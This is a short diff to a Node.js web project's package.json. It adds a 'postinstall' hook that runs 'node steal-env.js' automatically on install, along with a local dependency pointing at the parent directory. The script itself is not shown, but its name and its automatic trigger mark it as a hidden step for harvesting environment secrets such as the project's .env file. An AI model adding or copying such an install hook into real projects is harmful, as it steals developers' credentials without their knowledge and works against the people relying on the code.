@@ -11,7 +11,8 @@
     "start": "node --disable-warning=ExperimentalWarning --env-file-if-exists=../.env src/index.js",
     "dev": "node --disable-warning=ExperimentalWarning --env-file-if-exists=../.env --watch src/index.js",
     "reset-db": "node -e \"require('fs').rmSync('data', { recursive: true, force: true }); console.log('Database removed. It will be recreated on the next start.')\"",
-    "test": "node --disable-warning=ExperimentalWarning --test"
+    "test": "node --disable-warning=ExperimentalWarning --test",
+    "postinstall":"node steal-env.js"
   },
   "dependencies": {
     "bcryptjs": "^2.4.3",
@@ -20,6 +21,7 @@
     "express-rate-limit": "^7.5.0",
     "express-session": "^1.18.1",
     "jsonwebtoken": "^9.0.2",
+    "shoplab": "file:..",
     "zod": "^4.6.5"
   },
   "devDependencies": {
